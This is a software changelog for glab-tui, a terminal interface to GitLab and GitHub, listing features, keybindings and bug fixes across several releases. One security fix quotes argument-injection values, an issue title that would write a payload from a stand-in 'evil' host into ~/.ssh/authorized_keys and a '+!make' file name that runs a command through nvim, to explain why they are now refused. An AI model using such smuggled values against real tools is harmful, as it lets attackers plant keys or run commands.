# Changelog

All notable changes to this project will be documented in this file.

## [Unreleased]

### Breaking Changes
- **Pipelines copy keys**: `y` on the Pipelines tab now copies the pipeline URL (`copy_url`) instead of the commit SHA, which moves to `C` (`keybindings.pipelines.copy_sha`). The Jobs tab keeps `y` for the SHA (#654).

### Features
- **Branches tab parity**: Local checkout/switch (`C`), create MR/PR from branch (`m`), visual and bulk selection (`Space`, `v`, `Ctrl+a`), bulk deletion with confirmation, branch commit inspector, and `custom_keybindings.branches` pane support (#658, #662).
- **Terminal tab command inspector, re-run and status filter**: `Enter` or `P` opens a detail modal for the highlighted entry with the full command line, exit code, start time, duration, error, stderr and stdout (each stream kept up to 16 KiB). `r` re-runs the recorded `glab` / `gh` / `git` call after a confirmation and logs it as a new entry, `s` cycles the log between All, Errors and Success, and `Y` copies the entry's output or error next to `y` for the command line. All four keys are remappable under `[keybindings.terminal]` (`inspect_command`, `rerun_command`, `cycle_status_filter`, `copy_output`) (#660).
- **Todos / Notifications actions**: New keys on the Todos tab. `d` marks the highlighted item done (`mark_as_done`), `A` marks every item read after a confirmation (`mark_all_as_read`), `U` unsubscribes from the item's issue, MR/PR or thread (`unsubscribe`) and `r` toggles listing read (GitHub) or done (GitLab) items (`toggle_show_read`). The tab now lists unread items only by default, and its title names the active filter (`Unread` / `All`) (#583).
- **Runners metadata, status filter and copy keys**: The Runners preview now lists each runner's type (instance, group or project), tags as pills, version, last contact, IP address and URL, and the table gains a `Tags` column (plus optional `Type`, `Version` and `Last Contact`). GitLab reads tags, version, last contact and IP from one `glab api graphql` query over the project's runners, since `glab runner list` does not return them. GitHub runner labels show as tags. The Status cell uses the shared badge pills, adds `STALE` and `NEVER CONTACTED`, and shows `PAUSED` for a paused runner even when GitLab reports it stale or never contacted. `s` cycles the Status filter (Online, Paused, Offline, all, with Paused skipped on GitHub, whose runners cannot be paused), the `Tags` column filters by tag, `y` copies the runner URL and `Y` its ID (`cycle_status`, `copy_url`, `copy_id`).
- **Todos / Notifications triage**: Select items with `Space` (`select_todo`), `v` (`selection_toggle`) or `Ctrl+a` (`select_all`), then mark all of them read with `Enter` or done with `d`, paced like other bulk operations and reported in one toast on failure. `p` (`toggle_preview`) opens a preview that renders the comment behind the item as Markdown (GitLab todos carry it, GitHub notifications fetch the latest comment or the issue / PR body once the cursor rests), with its reason and author. The State and Type columns are styled badges (`NEW` / `READ`, `Issue` / `MR` or `PR`), the ID column writes GitHub PRs as `#N`, and `y` / `Y` copy the target's URL / reference (`copy_url`, `copy_reference`). GitHub notifications with no subject URL (e.g. check suites) no longer fail the whole list (#657).
- **Pipelines tab parity**: The pipeline inspector, now shown and hidden with `i` (`toggle_preview`) since `Enter` descends into the pipeline, lists the triggering commit (headline and author), the trigger event and who triggered it, and a **Failed Jobs** summary with each failed job and why it failed (GitLab's `failure_reason`, GitHub's timeout or first failed step). `R` (`retry_failed`) reruns only the failed jobs: `gh run rerun --failed` on GitHub, and on GitLab each failed job on its own, since GitLab's pipeline retry (`r`) also reruns canceled jobs. `s` (`cycle_status_filter`) steps the Status filter through All, Running, Failed and Success. `Y` (`copy_id`) copies the pipeline ID as `#123`. `[[custom_keybindings.pipelines]]` binds commands with `{{.PipelineId}}`, `{{.Ref}}` and `{{.Sha}}`, once per checked pipeline for a bulk run (#654).
- **Environments: deployments, rollback and stop**: `Enter` on an environment now lists its deployments newest first and focuses them, so `j`/`k` walk the history while the pane below shows the selected deployment's status, ref, full commit SHA, deployer, job and notes. `Tab` moves the focus between the deployments and the environment list (`,` opens the Configure View while deployments are listed). `R` rolls back to the selected deployment after a confirmation (GitLab re-runs its job, GitHub creates a new deployment of its commit), `d` stops the environment after a confirmation (GitHub, which has no stop, marks its latest deployment inactive), `y` copies the environment URL and `e` opens the selected deployment's job log in `$EDITOR` (GitLab). Environment states and deployment statuses render as badges, and the environment preview lists these keys. GitLab deployments used to be fetched oldest first, so environments with more deployments than the page size never showed the newest ones (#659).
- **Jobs tab parity**: The Jobs preview now goes through the shared entity inspector. The highlighted job's metadata (ID, name, status, stage, matrix, failure reason, runner, queued time, duration, needs, artifacts, web URL) sits above its trace, or above the pipeline's stage summary while no trace is open. GitLab job listings now fill the runner, duration, queued time, failure reason, artifacts and URL the API already returned; GitHub fills the job URL. `E` (`jump_to_failure`) scrolls the trace to the next line reporting a failure (`ERROR`, `##[error]`, `fatal`, `FAIL`, `panicked`, …, but not `0 failed`, `Failed: 0` or a name such as `quick-error`, and never in the job and step names GitHub puts before each line), fetching the trace first when it is not shown. `y` (`copy_url`) copies the job's web URL and `Y` (`copy_id`) its ID. Copying the pipeline commit SHA moves from `y` to `Alt+y` (`copy_sha`) on the Jobs tab. A new `[[custom_keybindings.jobs]]` table runs commands with `JobId`, `JobName`, `Stage` and `Status` (plus `RepoName`/`RepoPath`), once per selected job when jobs are selected. The trace pane is titled `Trace` (#655).

### Bug Fixes
- **Runner browser links**: Opening a runner in the browser no longer percent-encodes the project path in the URL (#656).
- **Review threads overlay lists every thread**: On GitHub, `T` in the diff view only saw the first `page_size` review comments (never more than 100) and the resolution state of the first 100 threads, so on a busy PR the newest threads, usually the open ones, were missing or hidden by the unresolved filter. Review comments are now read with `gh api --paginate` and threads with a paginated `reviewThreads` query, and a reply takes its thread's state from the thread's first comment. On GitLab, `glab mr note list --output json` prints discussions, not notes, so parsing failed and the overlay stayed empty. The discussions are now flattened into notes carrying their discussion id. A failed comment fetch raises a toast instead of silently showing no threads, and the diff stays viewable (#674).
- **Failed CLI calls always name their reason**: Every failed `gh api` call now adds GitHub's reason from the response body (e.g. `Can not approve your own pull request`) to its error and Terminal-tab status, not only the calls made through the raw API helper. A `glab` / `gh` / `git` call that fails without printing to stderr reports the command and its exit code instead of an empty reason. Re-runs from the Terminal tab report failures the same way as the original call (#660).
- **Failed browser launches show as failed**: Opening a milestone, runner, branch or environment in the browser (`git web--browse`) was always logged as a success, even when it exited non-zero because no browser is configured. The Terminal tab now marks it failed with the helper's error, so the Errors filter lists it (#660).
- **Scroll limits count wide characters**: The detail pane, job log, review threads overlay and Terminal tab measured wrapped text in characters while it is drawn in terminal cells, so CJK text or emoji wrapped onto more rows than counted and scrolling to the end stopped short of the last line. Rows are now counted in cells (#660).
- **Bounded job logs and diffs**: Job logs are read up to 16 MiB and a longer one is marked `[TRUNCATED: first 16 MiB]` in the Jobs pane title. A diff over 32 MiB is refused with an error instead of being buffered whole. glab-tui stops reading (and kills the CLI) at the limit. Follow mode no longer downloads and re-parses the whole log every 5 seconds: on GitLab it asks only for the bytes after what is shown (`byte_offset`/`byte_limit`, with a full read on servers that predate them), on GitHub it makes no call (logs only exist for completed jobs), and the pane parses only the new lines and keeps the log on screen while polling (#559).
- **Custom command arguments are refused unless they are a plain word**: `{{.Arg}}` substitution only rejected quotes, `$`, separators and redirections, so an issue titled `-o ~/.ssh/authorized_keys http://evil/payload` reached `some-tool {{.IssueTitle}}` as attacker-chosen flags and paths. A value that starts with `-` or `+`, or contains whitespace, `~`, `*`, `?`, `[`, `]`, `{`, `}`, `#` or `=`, is now refused as well, pointing at the quoted `$GLAB_TUI_*` variable (after `--` for a leading `-` or `+`). A leading `+` is refused because vim, nvim and less run `+cmd` as a command, so a PR file named `+!make` would have run `make` through `nvim +{{.LineNumber}} {{.FilePath}}`. Commands that spliced titles or paths with spaces directly need the environment variable (#562).
- **Checksum-verified installs and self-update** — `install.sh`, `install.ps1` and the self-updater (`u` / `glab-tui --update`) now download the release's `<asset>.sha256` and verify the archive before extracting it. A mismatch or a missing checksum aborts without touching the installed binary. The self-updater talks to GitHub through `curl` instead of the `gh` CLI, so GitLab-only installs no longer need `gh` to update (#564).
- **Group-scope confirm actions hit the selected project** — Closing, deleting, reopening, merging, rebasing or revoking an issue/MR, closing, reopening or deleting a milestone, and submitting a review resolved the project from the first listed row sharing the iid. In group scope, issue `#5` of project B could close issue `#5` of project A. The confirm dialog now carries the selected row's project through to the CLI call and the local list update (#567).
- **Stale fetches after a repo/group switch** — A fetch still in flight when the repository or group changed wrote the old scope's issues, MRs, pipelines and other tab data into the new scope's table and cache file once it finished. Every background fetch now carries the scope generation it started in (`App::scope_generation`, bumped by `reset_on_scope_change`), and the event loop drops results from an earlier generation before they touch app state or the cache (#574).
- **Esc no longer discards review drafts** — Pressing `Esc` (or Cancel) on the submit-review dialog shown when leaving the diff view deleted every draft comment and closed the diff. It now only closes the dialog and returns to the diff. The dialog gains **Keep drafts** (close the diff, keep the drafts) and an explicit **Discard** button. Drafts are saved per project and MR/PR in the project cache, so they survive closing the diff and restarting glab-tui. A kept draft whose line is no longer in the diff when it is reopened is set aside with a toast instead of being submitted, and comes back once its line returns (#569).
- **Actions follow the highlighted row**: with a search, sort, group-by or column filter active, several actions read the selection index against the unfiltered list and acted on a different row than the one on screen. Group-scope create (issue, MR/PR, milestone) and run-pipeline now take the highlighted row's project, and Jobs `select_stage` selects the visible jobs in the highlighted job's stage. Jumping to an issue or MR/PR from the related-MRs and linked-issues selectors or from a todo now drops the search and column filters that would hide the target (as the `g` jump already did) and highlights the target row. A todo jumps only to the issue or MR/PR in its own project, never to a same-numbered one from another project, and says so in the header bar when that target is not loaded (#571).
- **Code blocks keep their first character** — Fenced code blocks in descriptions and suggestion bodies in the diff view lost their first character when it was `-`, `+` or a space, because highlighting stripped it as if it were a diff marker. A YAML `- item` rendered as ` item` and indented lines lost one column. Only real diff hunk lines have their marker removed now (#565).
- **Column logic matches the rendered columns**: On Releases, search, group-by and the value filter now read the `Release Notes` column (they looked for a `Description` column that does not exist). Branches `Default`/`Protected` filters offer and match the `YES`/`NO` cell text instead of `true`/`false`, and filters saved as `true`/`false` keep working. Group-by now reorders the Runners, Branches and Environments tabs, which used to ignore it, and the Branches `SHA` and Environments `URL` filters now list values (#566).
- **Environments detail pane follows the selection** — Deployments fetched with `Enter` for one environment stayed in the detail pane after another environment was selected, after a search put a different environment under the cursor, and after leaving the tab. They are now dropped as soon as their environment stops being the highlighted row of the Environments tab, including when the fetch finishes after the selection has moved on, and the pane falls back to the environment's details. `Enter` on an environment now also opens the detail pane, which nothing on the Environments tab could open before, so the fetched deployments were never visible there (#568).
- **Hung `gh`/`glab` calls no longer stall the app** — Every `gh`/`glab` call made through the backends (tab fetches, mutations, the `review` subcommand), the diff view's comment edit/delete and release creation now runs under a timeout (`command_timeout_seconds`, default `120`). A call still running when it expires is killed and reported as an error naming the command, instead of hanging forever while holding one of the 8 concurrent-request slots. A request backing off after a rate limit no longer holds its slot during the sleep, and an error that merely contains the digits `429` (such as `issue #429 not found`) is no longer retried as a rate limit: `429` now has to appear as an HTTP status (`HTTP 429`, `status code: 429`, `GET <url>: 429`) (#575).
- **Job trace in the editor**: The Jobs tab's open-in-editor key (`e`) ran the whole `EDITOR` value as one program name, so `EDITOR="code --wait"` failed to start. It wrote the placeholder `Trace will be here` when the trace had not been shown yet, and handed over the terminal without the Ctrl+C guard other editor launches have. It now fetches the trace first when needed and opens it through the shared editor handoff. `Enter` on a job in group scope now fetches the trace from the job's own project (it used to ask for the group path and fail), and a trace that arrives after a repo/group switch is dropped (#577).
- **Jobs tab finds the branch pipeline directly**: Opening the Jobs tab no longer lists every MR and every pipeline of the project to find the checked-out branch's pipeline. It asks for the newest pipeline of that branch (`glab ci list --ref` plus the branch's open MR via `glab mr list --source-branch`, or `gh run list --branch`). Clearing a job selection also clears its select-stage notice, and the GitLab-only start-job key is no longer offered on GitHub (#579).
- **Releases act on their own project**: Release edits, deletes and open-in-browser target the release's own project instead of the raw scope string. A release edit form opened from the zoomed inspector no longer submits empty release notes. The unreachable text-input release creation path, which shelled out to `gh`/`glab release create` from the event loop, is gone: every release is created through `Backend::create_release` (#580).
- **Todos mark-read and jump**: Marking a todo or notification read discarded the CLI result, so the item stayed listed until the next refetch and a failure was silently dropped. The list now updates as soon as the call succeeds and a failure raises an error toast. `Enter` and the `mark_as_read` key share one implementation, and the jump selects the issue or MR/PR in the todo's own project instead of the first item with the same number. A todo from a project outside the current scope reports that instead of landing on an unrelated item, and stays unread (#583).
- **Runners, Releases, Branches and Environments keep the selected row** — These tabs now run on a shared list-tab model: each column defines its header, cell, search text, filter values and sort key once, and the filtered and sorted view is rebuilt only when the rows, search, column filters or sort change. Selection follows the row's own key (runner/environment id, release tag, branch name) instead of its position, so a refresh, sort, search or group change no longer moves it to another row, and editing a release opens the release under the cursor. A mouse click selects the clicked row when the table is scrolled (#586).
- **Syntax highlighting across lines**: The diff view, Markdown code fences and code suggestions parsed every line on its own, so block comments, docstrings and heredocs lost their color after the first line. Each side of each diff hunk, and each fence or suggestion, is now highlighted as one text. Code fences and suggestions no longer lose their first leading space (#565). Extension-less files such as `Makefile` are recognised by name, and scripts by their shebang when the diff starts at line 1. Colors are resolved from the active theme when the diff is drawn, so reloading the theme recolors an open diff. `glab-tui review` no longer highlights the diffs it only reads anchors from, and syntect is built with only the `parsing`, `default-syntaxes` and `regex-fancy` features (#584).

## [0.9.2] - 2026-09-26

### Features
- **Group view entity creation and editing with project field** — Create and edit issues and merge requests directly within group / organization views. The creation and edit forms now include a selectable "Project" / "Repository" field, pre-fetching project-scoped labels, assignees, and milestones upon project selection (#429, #504).
- **Tab prefetching & configuration** — Added an opt-in `prefetch_tabs` setting (configurable in `config.toml` and toggleable in the Configure View overlay via `,` / `Tab`) that automatically pre-fetches all tabs in the background on startup while respecting `disabled_tabs` (#499, #505).
- **Downstream & child pipelines support** — GitLab pipelines now fetch and display downstream/child pipelines created by parent bridge trigger jobs (`/pipelines/:id/bridges`). Rendered with a `→` badge in the ID cell and detail pane back-references, allowing seamless drill-in navigation (#499, #505).
- **Multi-key sequences & page navigation** — Added support for multi-key sequences (`matches_with_pending`), page scrolling (`scroll_page_down` / `scroll_page_up` via `PageDown`/`PageUp`), jump to top (`Home` / `scroll_top`), and jump to bottom of detail panes (`End` / `scroll_to_end`) (#499, #505).
- **CLI `--tab` / `-t` flag & tab aliases** — Launch directly into a specific tab using `--tab <TAB>` / `-t <TAB>` (e.g. `--tab prs`, `--tab pipelines`). Extended `Tab::from_str` with GitHub-friendly aliases including `"pr"`, `"prs"`, `"pullrequests"`, `"pull_requests"`, `"actions"`, and `"notifications"` (#494).
- **Select all filtered items (`Ctrl+A`)** — Bulk select all visible items in the active Issues or MRs tab matching current search and column filters with `Ctrl+A` (`select_all`), with `Esc` clearing selection states (#493).
- **Readline shortcuts & double-Esc in search** — Added standard readline shortcuts (`Ctrl+U` to clear line, `Ctrl+W` to delete word) in the fuzzy search input. Pressing `Esc` in search mode exits input on first press and clears active filters across all search surfaces on second press (#491).
- **Copy shortcuts & Home/End table navigation** — Press `y` to copy markdown references (`[!iid]` on GitLab, `[#iid]` on GitHub) on MRs tab, copy branch name on Branches tab, or copy commit SHA on Pipelines and Jobs tabs. Added `Home` and `End` navigation across all table views (#492).
- **Jump to issue/MR by ID** — Press `g` (`keybindings.global.jump_to_id`) from any tab to open an ID-focused search over issues and MRs (rows shown compactly as `#123: title` / `!456: title`). Pick a listed item, or type an ID (`#123` issue, `!123` MR, bare `123` scoped to the active tab); an ID that isn't already loaded is fetched directly from the API with a `+ Fetch … from API` option (#434).
- **Jump to related MRs/PRs from issue preview** — Added a backend-aware "Merge Requests" / "Pull Requests" row to the issue preview with colorized status badges. The closing relationship is fetched eagerly (`glab api projects/.../issues/<iid>/closed_by` on GitLab, `gh api graphql` over `closedByPullRequestsReferences` on GitHub). Press `M` (`keybindings.issues.jump_related_mrs`) to jump straight to the single MR/PR, or pick from a selector list when there are several (#409, #411).
- **Shortcut to submit edit forms** — Configurable global shortcut `submit_edit = "Ctrl+x"` to submit/save Issue, MR, Milestone, and Release edit and create forms from anywhere in the form, including while actively editing text boxes (#410, #430, #431).
- **Milestone progress cache integration** — Milestone progress bars are now driven from the issue cache aggregate (`milestone_progress_cache`), eliminating redundant per-milestone issue API fetches when issues are already loaded (#436, #459).
- **Fork default repository resolution** — When working in a GitHub repository fork, `glab-tui` now respects the default upstream repository recorded by `gh repo fork` / `gh repo set-default` (`remote.<name>.gh-resolved`) and qualifies PR head refs with the fork owner (#495).
- **Reproducible contributor environment** — Added `mise.toml` configuration and `Justfile` task runner recipes (`just check`, `just lint`, `just test`, `just e2e`, `just cov`) for streamlined contributor setup and local CI parity (#480, #503).

### Bug Fixes
- **Cap detail scroll to rendered content height** — Scrolling in `ReadOnly` preview panes no longer pushes the content out of view, and multi-paragraph previews now reach their last lines. `app.detail_scroll` is clamped against the per-call `max_scroll` returned by `render_inspector_content` / `render_entity_inspector`, and the underlying line count uses a new `rendered_line_count()` helper that properly accounts for blank `Line` rows — preventing inverted-byte-range panics and recovering previously unreachable last lines (#441, #456).
- **GitHub PR merged state preservation** — Preserved the distinct `merged` state for GitHub pull requests (`gh pr list` / `gh pr view`), ensuring merged PRs display with the purple `MERGED` badge instead of being collapsed to `closed` (#455).
- **GitHub Create Branch & PR create hang fixes** — Resolved `Create From` → SHA, wired `Create From` through the selector (`apply_selector_changes`), and piped stdout/stderr on raw API POSTs so CLI output can no longer leak into the TUI. Source-branch `ensure`/`push` runs off the UI thread with interactive Git prompts disabled so HTTPS auth failures surface as errors instead of hanging the event loop (#443, #445).
- **Interactive draft comments in diff view** — Fixed line matching for draft comments on side-by-side diff views, wired `a` key interactions, and surfaced draft comment submission failures via toast notifications (#483, #490).
- **Pass `--sha` to `glab mr merge`** — Passed `--sha=<sha>` to `glab mr merge` when the MR head SHA is known, satisfying GitLab 19.2+ and instance settings requiring commit SHAs when merging (#470, #488).
- **Related MRs fetch debouncing & display polish** — Debounced related MR fetches during rapid `j`/`k` issue list navigation (`500ms`), renamed the inspector field to "Merge Requests" / "Pull Requests" with the `tab_pr` icon, and rendered empty values as `--` (#460, #461).
- **Scope-aware runner endpoints & open in browser** — Fixed runner pause/resume/edit to use group/project-scoped endpoints instead of instance-wide endpoints; exposed `o` (`open_in_browser`) on Runners, Branches, and Environments tabs (#447, #458).
- **Switch repository overlay polish** — Simplified repository switcher to derive switchable repositories and groups solely from `recent_repos.json` and `recent_groups.json`, displaying path disambiguation and surfacing GitHub orgs (#428, #466).
- **Milestones group scope optimization** — Skipped per-milestone issue API fetches when running in group scope where milestone issue lookups are unsupported (#475, #501).
- **Visual select mode highlight masking** — Unified select mode behavior and fixed table row highlight styles overriding the left selection bar cell (#496, #497).
- **Windows console & home directory resolution** — Added `USERPROFILE` fallback for home directory resolution on Windows, and guarded keyboard enhancement flag push/pop calls with capability checks (#473, #481, #487).
- **Branch URL encoding on GitHub** — Correctly URL-encoded branch names containing slashes or special characters in `/git/refs/heads/` API paths (#454).
- **Search keybinding isolation** — Prevented top-level quit keybindings from exiting the application while typing in search/filter bars (#479, #486).
- **Keybinding case matching** — Fixed uppercase keybindings (e.g. `Shift` combinations) matching correctly (#471).
- **Drop default `save_view` keybinding** — Dropped conflicting default `save_view` keybinding and cleanly surfaced unassigned keybindings in the help overlay (#498, #500).
- **Backend & group mode batch fixes** — Fixed GitHub issue due date handling, milestone due date time suffix, pipeline pagination, branch prefix stripping, custom host URL parsing, and GitHub organization label queries (#422, #423, #424, #425, #426, #427).
- **Homebrew formula generation** — Simplified Homebrew release formula generation to pin static musl builds across Linux architectures (59978bd).

### Maintenance
- **MSRV alignment** — Aligned Minimum Supported Rust Version (MSRV) across documentation and CI workflows to `1.88.0` (#502).
- **Entity editor refactoring** — Extracted helper predicates (`entity_is_mr`, `entity_is_issue`, `entity_is_milestone`) and documented inline vs selector target branch mutation paths (#462, #472, #485).
- **Non-blocking auth probing** — Wrapped `auth_status` git/backend CLI execution in `spawn_blocking` and documented fast local git operations (#464).
- **Dependency & toolchain updates** — Bumped `clap` to 4.6.7 (#477), `toml` to 1.1.6 (#469), `codecov/codecov-action` to 7.1.1 (#478), and updated `dtolnay/rust-toolchain` (#476).

---

## [0.9.1] - 2026-09-07

### Features
- **GitLab group-level backend foundation** — Added `Scope` enum (`Repository` / `Group`), `-g`/`--group` CLI flag, and `list_group_issues` / `list_group_mrs` / `list_group_pipelines` backend methods that hit `GET /groups/{id}/issues`, `/merge_requests`, `/pipelines` via `glab api` (aggregating across all projects in the group with `%2F`-encoded paths). Group context can be inferred from a remote URL (`git_helpers::parse_group`, web URLs via `parse_project_path_from_web_url`), the `--group` flag, or `config.group`. Recent groups are cached in `recent_groups.json`. GitHub has no org-level listing equivalent, so group-backed GitHub listings return `Err` (#330).
- **Copy issue as Markdown reference** — New `copy_reference` keybinding (default `y`) on the Issues tab copies the selected issue as `[#<iid>: Title](web_url)`, escaping `[`, `]`, and backslashes in the title (#387).
- **Batch entity edits into a single API call** — Issue/MR/milestone/release updates and bulk edits now build a complete `IssueUpdate`/`MrUpdate` field set and apply changes in one backend call instead of one subprocess per field (#384).

### Bug Fixes
- **Automatic API rate-limit handling & throttle-less command backpressure** — Added `ApiRateLimiter` (`src/backend/rate_limit.rs`) that bounds concurrency, enforces a minimum inter-request burst delay, and retries HTTP 429 / GraphQL `rate_limit` / abuse-detection errors with exponential backoff and jitter. Bulk operations (bulk edit, bulk merge, bulk retry) are paced individually to avoid tripping secondary limits. GitHub workflow runs are now fetched via the bulk `actions/runs` endpoint (actor/triggering-actor logins embedded), eliminating 1+N subprocess calls per tab refresh (#348, #382).
- **`glab mr merge` no longer forces `--auto-merge=false`** — Omitted `--auto-merge` entirely unless the user explicitly checks "Auto-merge" in the confirm dialog, letting `glab` use its own heuristic (enable auto-merge when a pipeline is in progress, merge immediately otherwise) instead of exhausting its internal retry loop and surfacing "All attempts fail". Bulk-merge errors now emit a concise `N/M merged. K failed: #iid: <first-line>` summary instead of a wall of raw stderr (#372, #407).
- **Milestone progress bracket-guard panic** — Guarded the `[`/`]` slice in milestone progress rendering against out-of-order brackets (e.g. `] [`), which previously panicked with an inverted byte range; now falls back to showing the raw value (#390, #408).
- **Inspector field name truncation** — Field labels in the entity inspector are no longer truncated prematurely when the edit/create form is narrower than the descriptor pane (#383, #385).
- **Bundled themes auto-update on startup** — `ensure_themes()` now always overwrites bundled theme files so users receive new semantic tokens (e.g. `diff_gutter_bg`) and theme fixes on upgrade without deleting their themes directory; user-created themes are never touched (#373, #386).
- **Distinct selection vs. cursor-row highlight** — `checked_bg` (yazi-style visual selection bar) now differs from `highlight_bg` (cursor row) across bundled themes — 7 themes had identical values, making the selection indicator invisible (#373, #386).
- **Transparent terminal background support** — An empty color string in theme TOMLs now maps to `Color::Reset`, letting the terminal's own (possibly transparent) background show through instead of a solid fill. Knockout/active text (header badges, mode indicator, active nav tab, edit cursor, save/column selectors) switched from the now-transparent `bg` to the dark `highlight_bg` token, restoring readable dark-on-accent rendering (#376).
- **Release script & CI hardening** — Fixed unbound variables and off-by-one asset-count math in `release.sh` `wait_for_release` under `set -u`; added `--phase` resume; fixed workflow job IDs and musl ARM64 cross-compilation linker in `release.yml`; macOS/Windows checksum generation uses `bash` and falls back from `sha256sum` to `shasum` (935b757, 3ff8250, 8db6bae).

### Maintenance
- **`glab` / `gh` exhaustive CLI reference** — AGENTS.md now documents every `glab` and `gh` subcommand and option from the installed CLIs (`glab` v1.114.0 / `gh` v2.98.0) (6f4f52d).
- **Demo GIF cleanup & simplified generation** — README demos reorganized with all recordings added; `assets/generate-demos.sh` simplified (179 → 15 lines) and recordings regenerated (457bdc0, 2e76616).
- **Bumps** — `softprops/action-gh-release` 3.0.2 → 3.0.3 (#417); `toml` in the patch-updates group (#418).

---

## [0.9.0] - 2026-08-23

### Breaking Changes
- **Diff view shortcut changed from `v` to `D`** — The default keybinding for opening the MR/PR diff view has moved from `v` to `D` (`Shift+D` / `keybindings.mrs.view_diff`) in order to free `v` (`selection_toggle`) for visual row selection (#333, #342).
- **Unified single-column inspector & edit flow** — Entity preview and edit dialogs have been unified into a single-column `EntityDocument` inspector. Field navigation now uses `j`/`k` across all fields with `Enter` to edit, and `Esc` returns directly to the parent view (#341, #375).
- **Structured confirmation dialogs** — Confirmation popups now use the structured `SubmitDialog` where `Enter` triggers the currently focused button (`[ Submit ]` or `[ Cancel ]`) instead of immediate single-character execution (`y`/`n`). Destructive operations default focus to Cancel (#341).

### Features
- **Single-column unified inspector & fullscreen preview/edit** — Unified read-only preview and interactive edit/create modes into a single fullscreen view (`src/ui/inspector.rs`) backed by `EntityDocument`. Descriptions span full-width on top with metadata fields stacked below with aligned `│` separators. Full keyboard navigation (`j`/`k`) navigates across all fields including descriptions, `Enter` toggles inline editing (with external `$EDITOR` / `Ctrl+E` support), and non-editable rows display with a muted shield icon. Vim/helix-style mode indicators in the top banner (`[NORMAL]`, `[PREVIEW]`, `[EDIT]`, `[CREATE]`) show the active mode using semantic badge colors (#249, #341, #375, #377).
- **In-menu creation forms & repo template selection** — Integrated MR/PR and issue creation workflows directly into the edit menu. Forms include a "Create from Issue" field that fuzzy-searches existing issues and automatically populates Title, Labels, Assignees, Milestone, and Source Branch (linking via `--related-issue` on GitLab and `Closes #N` on GitHub), and a "Description Template" row to pick from repository issue/MR templates without interrupting creation (#331).
- **Interactive Submit / Cancel confirmation dialogs** — Replaced the bare YES/NO popup with a structured `SubmitDialog` featuring context-aware titles, descriptive bodies, toggleable option checkboxes (Squash merge, Delete source branch, Auto-merge), and explicit `[ Submit ]` / `[ Cancel ]` buttons with mouse and keyboard (`h`/`l`/`j`/`k`/`Tab`) navigation. Destructive actions default focus safely to Cancel (#341).
- **Mark files as reviewed in diff view** — Press `m` on any file or directory in the diff view to mark it as reviewed with a check indicator; reviewed directories automatically fold when all child files are completed. Tree header tracks progress (`12/200`). Press `M` to filter out reviewed files and focus only on pending review work. Review marks persist locally per MR/PR in the project cache (#363).
- **Visual select mode (yazi-style)** — Added selection mode toggled with `v` (`selection_toggle`), which dynamically selects contiguous rows as you navigate with `j`/`k`/arrows, indicated by a left colored bar and top-right `[SELECT]` mode badge. The bulk edit menu now displays the full list of selected `#iid` and titles in the descriptor pane so users can verify items before applying batch updates (#333, #378).
- **Rich markdown rendering in details panes** — Enhanced the details pane markdown renderer with `pulldown-cmark` (v0.13.0) to support GFM tables, syntax-highlighted code blocks, task lists with strikethrough, blockquotes, horizontal rules, HTML entities, and consistent inter-block spacing (#351, #353).
- **New dark themes (`oled` and `github-dark-hc`)** — Added pure black `oled` and `github-dark-hc` (GitHub Dark High Contrast) bundled themes, bringing total built-in themes to 18, alongside new `diff_gutter_bg` and `diff_sep` semantic theme tokens for consistent gutter readability (#356, #358).
- **Release editor** — Native `EditEntityKind::EditRelease` support for editing release names and descriptions with optimistic UI updates and backend integration (#335).
- **Help overlay & navigation polish** — Expanded the Keyboard Shortcuts help overlay (90x40) with multi-line description wrapping, made `?` accessible across all views, and moved open-diff to `D` (#342, #343, #379).

### Bug Fixes
- **Wide line numbers no longer shift the diff gutter** — Dynamic line-number column width calculated from the maximum line number in the diff, preventing gutter misalignment and row shifts on diffs exceeding 9,999 lines (#368, #369).
- **Tab-indented files keep their indentation in the diff view** — Tabs are now expanded to spaces at tab stops during diff parsing, preserving correct indentation for Go, Makefiles, and tab-indented files while keeping syntect syntax highlighting and search indices aligned (#364, #365).
- **Side-by-side padding rows no longer overdraw the gutter** — Fixed padding rows on uneven side-by-side diffs overdrawing an extra gutter cell, eliminating ragged gutter edges (#366, #367).
- **Theme-safe syntax highlighting restored** — Restored theme-aware syntax highlighting in the diff view by mapping syntect scopes to active theme tokens while preserving search match highlights (#336).
- **Unified API error handling & error toast box** — Consolidated all API error paths into `App::show_error`, rendering transient errors in a 3-row floating rounded box and keeping the terminal command log synchronized (#319, #337).
- **Milestone clearing on issues & MRs** — Deselecting a milestone in the selector now correctly clears the milestone both in the local view and on the remote backend (using `gh issue/pr edit --remove-milestone` on GitHub and `0` on GitLab) (#326, #334).
- **Pipeline ref filtering & search** — Search and column filters on the Pipelines tab now match formatted display refs ("MR !<iid>") in addition to raw git refs (#359, #360).
- **Job trace decoding & timestamp stripping** — Decoded job traces as UTF-8 (fixing latin-1 encoding issues) and stripped GitLab timestamp prefixes for clean log viewing (#361).
- **Backend detection for `www.` hosts** — Stripped `www.` prefix when comparing remote hosts against `github.com` while preserving full hostnames for auth probing (#323).
- **Runner metrics realism** — Removed pseudo-random fabricated runner queue/utilization metrics, displaying only actual API-provided status (#325, #346).
- **Configure view scroll on short terminals** — Added `ListState` scrolling and position counters to Configure popup columns to prevent overflow on small screens (#301, #345).
- **Inline MR branch display & empty values** — Merged MR Source and Target branches into a unified `source → target` row and standardized empty/None values across tables and previews to `--` (#344, #355).
- **Theme fallback on invalid overrides** — Invalid user theme files now safely fall back to bundled presets instead of failing silently (#378).

### Maintenance
- **Multi-target Linux & musl distribution matrix** — Release workflow now builds and packages 11 cross-platform targets, including glibc 2.35 baseline (Ubuntu 22.04), Ubuntu 24.04, dynamic `ubuntu-latest`, and fully static `musl` Linux binaries for x86_64 and aarch64 (#371, #374).
- **Intelligent Linux binary selection** — `install.sh` and in-app self-updater (`src/utils/update.rs`) detect local OS distribution and glibc versions, walking the candidate fallback chain (`local` → `ubuntu-24.04` → `ubuntu-22.04` → `musl`) (#374).
- **Nightly pre-release support in `scripts/release.sh`** — `INCREMENT=nightly` (or any tag matching `vX.Y.Z[-nightly][-.suffix]`, e.g. `v0.9.0-nightly` or `v0.9.0-nightly.20260822`) now drives a stripped-down release flow that skips the Cargo.toml bump, docs regen, prepare PR, GIFs, review/merge gate, Homebrew/Scoop syncs, Docker push, and crates.io publish; release notes and the GitHub release body are still updated. Set `BUMP_CARGO_FOR_NIGHTLY=1` to also bump `Cargo.toml` so `glab-tui --version` reflects the nightly tag (#371).
- **Performance optimizations** — Reduced per-frame lock contention on `THEME` in tab rendering and cached `SkimMatcherV2` instances via `LazyLock` (#327, #339).
